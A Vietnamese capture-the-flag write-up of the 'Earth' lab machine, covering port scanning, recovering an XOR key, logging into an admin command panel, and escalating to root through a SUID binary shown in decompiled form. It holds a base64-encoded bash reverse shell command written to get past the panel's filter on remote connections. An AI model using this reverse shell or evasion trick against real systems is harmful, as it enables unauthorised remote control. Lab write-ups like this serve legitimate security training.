Trước tiên dùng nmap để quét toàn bộ những cổng được mở trên server
![img](img/nmap.png?raw=true)
Có thể thấy hiện tại đang có 3 cổng được mở là 22 với ssh, 80 là http và 443 là https và 2 tên DNS là earth.local và terratest.earth.local. Khả năng hai trang web sẽ được lưu trữ trên cùng một máy chủ, vì thế cần thêm các tên này vào tệp hosts để có thể sử dụng chúng trên trình duyệt web và truy cập vào các trang web mong muốn
![img](img/port%2080.png?raw=true)
Khi truy cập https://terratest.earth.local, trang web chỉ hiện dòng chữ "Test site, please ignore." Không có gì có thể giúp ích nên chúng ta sẽ tập trung vào earth.local. Nhưng trước tiên hãy thử dùng gobuster để xem có thể thấy những gì ở trên 2 trang này
![img](img/gobuster80.png?raw=true)
![img](img/gobuster443.png?raw=true)
Có thể thấy một path khá chú ý là /admin ở phía cổng 80 và /robots.txt ở phía cổng 443
```
User-Agent: *
Disallow: /*.asp
Disallow: /*.aspx
Disallow: /*.bat
Disallow: /*.c
Disallow: /*.cfm
Disallow: /*.cgi
Disallow: /*.com
Disallow: /*.dll
Disallow: /*.exe
Disallow: /*.htm
Disallow: /*.html
Disallow: /*.inc
Disallow: /*.jhtml
Disallow: /*.jsa
Disallow: /*.json
Disallow: /*.jsp
Disallow: /*.log
Disallow: /*.mdb
Disallow: /*.nsf
Disallow: /*.php
Disallow: /*.phtml
Disallow: /*.pl
Disallow: /*.reg
Disallow: /*.sh
Disallow: /*.shtml
Disallow: /*.sql
Disallow: /*.txt
Disallow: /*.xml
Disallow: /testingnotes.*
```
Đây là những gì thu được ở robots.txt dòng cuối rất đáng chú ý khi phần extension của testingnote lại bị bỏ sót. Tôi đã thử các extension khác nhau và chỉ .txt ra kết quả
```
Testing secure messaging system notes:
*Using XOR encryption as the algorithm, should be safe as used in RSA.
*Earth has confirmed they have received our sent messages.
*testdata.txt was used to test encryption.
*terra used as username for admin portal.
Todo:
*How do we send our monthly keys to Earth securely? Or should we change keys weekly?
*Need to test different key lengths to protect against bruteforce. How long should the key be?
*Need to improve the interface of the messaging interface and the admin panel, it's currently very basic.
```
Có thể thấy một vài thông tin rất quan trọng:
- Hệ thống sử dụng thuật toán XOR để mã hóa tin nhắn.
- testdata.txt là file được sử dụng để kiểm thử chức năng mã hóa. Đây là một filename đáng chú ý vì có thể tồn tại trên web server và chứa plaintext/ciphertext mẫu, từ đó giúp phân tích cách XOR được sử dụng.

Username terra dùng để đăng nhập trang /admin
Thử truy cập vào testdata.txt để kiểm tra
```
According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth's history, life appeared in the oceans and began to affect Earth's atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.
```
Đây có thể là khóa hoặc thông điệp của thuật toán XOR. Thêm vào đó ta nhận được đoạn mã hóa thu được từ trang earth.local. Sử dụng cyberchef để thực hiện giải mã thuật toán này
![img](img/cyberchef1.png?raw=true)
Ta có thể thấy cụm "earthclimatechangebad4humans" lặp lại khá nhiều đây có thể là khóa để mã hóa hoặc có thể là một password để đăng nhập trang admin. Sau khi thử mã hóa ngược lại đã thu được message lúc đầu
![img](img/cyberchef2.png?raw=true)
Sau khi thử nhập bằng username là terra và password vừa tìm được, tôi đã đăng nhập thành công
![img](img/loginsuccess.png?raw=true)
Sau khi quan sát tôi nhận thấy đây có thể trang web này cho phép thực thi lệnh và khi thử lệnh whoami thì web đã trả về kết quả apache
![img](img/whoami.png?raw=true)
# user_flag
Giờ thì thực hiện tìm flag1 bằng lệnh:
**find / -name "user_flag.txt"** để tìm đường dẫn đến kết quả sau đó đọc file ở đường dẫn tìm được này 
![img](img/user_flag.png?raw=true)
# root_flag
Chúng ta sẽ thử tìm đường dẫn của root_flag tuy nhiên trang web không trả kết quả gì về. Tiếp theo có thể thử thực hiện ssh vào máy chủ tức là sẽ dùng trang admin này để reverse shell. Sau khi kiểm tra lệnh bash trên máy chủ đã có sẵn và có thể thực hiện 
![img](img/bash.png?raw=true)
Tuy nhiên tôi lại nhận response của trang web rằng "Remote connections are forbidden." có lẽ có cơ chế phân tích văn bản đầu vào để tìm địa chỉ IP hay gì đó tương tự. Hãy thử chuyển sang dạng base64 và thực hiện lại với lệnh: 

```echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE5Ni4xMjgvMTIzNCAwPiYx" | base64 -d | bash```
![img](img/rce.png?raw=true)
Đã thực hiện thành công. Sau đó có thể thực hiện kiểm tra xem có tập tin nào được thiết lập bit SUID hay không
![img](img/find.png?raw=true)
Và có thể quan sát thấy một tập tin khá đáng chú ý là `reset_root`. Tôi đã thực hiện kiểm tra file này đây là một file ELF64 và chạy dưới quyền root, tôi sẽ tải file này về và thực hiện phân tích 

Sau khi sử dụng IDA để phân tích tôi đã thu được một mã giả
```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  __int64 v4; // [rsp+3h] [rbp-10BDh] BYREF
  char v5[5]; // [rsp+Bh] [rbp-10B5h] BYREF
  _QWORD v6[2]; // [rsp+10h] [rbp-10B0h] BYREF
  char v7; // [rsp+20h] [rbp-10A0h]
  __int64 v8[2]; // [rsp+30h] [rbp-1090h] BYREF
  char v9; // [rsp+40h] [rbp-1080h]
  char name[17]; // [rsp+50h] [rbp-1070h] BYREF
  char v11; // [rsp+61h] [rbp-105Fh]
  char v12[32]; // [rsp+1050h] [rbp-70h] BYREF
  char v13[32]; // [rsp+1070h] [rbp-50h] BYREF
  __int64 v14[2]; // [rsp+1090h] [rbp-30h] BYREF
  char v15; // [rsp+10A0h] [rbp-20h]
  _DWORD v16[4]; // [rsp+10B0h] [rbp-10h] BYREF

  strcpy((char *)v16, "palebluedot");
  v14[0] = 0x810190E07090904LL;
  v14[1] = 0x555C5D041C161D05LL;
  v15 = 94;
  strcpy(v12, "credentials root:theEarthisflat");
  v16[3] = 0;
  v8[0] = 0xD064314000C5BLL;
  v8[1] = 0x27077310B2A194ELL;
  v9 = 117;
  v6[0] = 0xD064314000C5BLL;
  v6[1] = 0x620067075B15284ELL;
  v7 = 7;
  v4 = 0x20061E4312081C5BLL;
  strcpy(v5, "Q%\a\x1B");
  magic_cipher(v14, v16, v13, 17LL, 12LL);
  v13[17] = 0;
  puts("CHECKING IF RESET TRIGGERS PRESENT...");
  magic_cipher(v8, v13, name, 17LL, 18LL);
  v11 = 0;
  if ( !access(name, 0) )
    ++v16[3];
  magic_cipher(v6, v13, name, 17LL, 18LL);
  v11 = 0;
  if ( !access(name, 0) )
    ++v16[3];
  magic_cipher(&v4, v13, name, 13LL, 18LL);
  name[13] = 0;
  if ( !access(name, 0) )
    ++v16[3];
  if ( v16[3] == 3 )
  {
    puts("RESET TRIGGERS ARE PRESENT, RESETTING ROOT PASSWORD TO: Earth");
    setuid(0);
    system("/usr/bin/echo 'root:Earth' | /usr/sbin/chpasswd");
  }
  else
  {
    puts("RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.");
  }
  return 0;
}
```
Sau khi phân tích binary, có thể thấy chương trình sử dụng hàm `magic_cipher()` để giải mã dữ liệu bằng phép XOR. Kết quả giải mã đầu tiên được sử dụng làm key để tiếp tục giải mã ba chuỗi khác, tương ứng với ba file/path đóng vai trò là **reset trigger**. Chương trình dùng `access()` để kiểm tra sự tồn tại của từng trigger và chỉ khi cả ba đều tồn tại thì cơ chế reset mới được kích hoạt. Khi đó, chương trình gọi `setuid(0)` và sử dụng `chpasswd` để thay đổi mật khẩu tài khoản `root` thành `Earth`. Ngoài ra, binary cũng chứa chuỗi `credentials root:theEarthisflat`, cho thấy thông tin liên quan đến tài khoản root được lưu trực tiếp trong chương trình.
![img](img/ltrace.png?raw=true)
Sử dụng ltrace để theo dõi các lời gọi access(), tôi xác định được chương trình kiểm tra sự tồn tại của ba file /dev/shm/kHgTFI5G, /dev/shm/Zw7bV9U5 và /tmp/kcM0Wewe. Khi cả ba file tồn tại, biến đếm đạt giá trị 3 và kích hoạt cơ chế reset password, trong đó mật khẩu tài khoản root được thay đổi thành Earth. Giờ chỉ cần tạo 3 file này trên hệ thống và chạy reset_root để đổi password của root và chúng ta sẽ có quyền root
![img](img/root.png?raw=true)
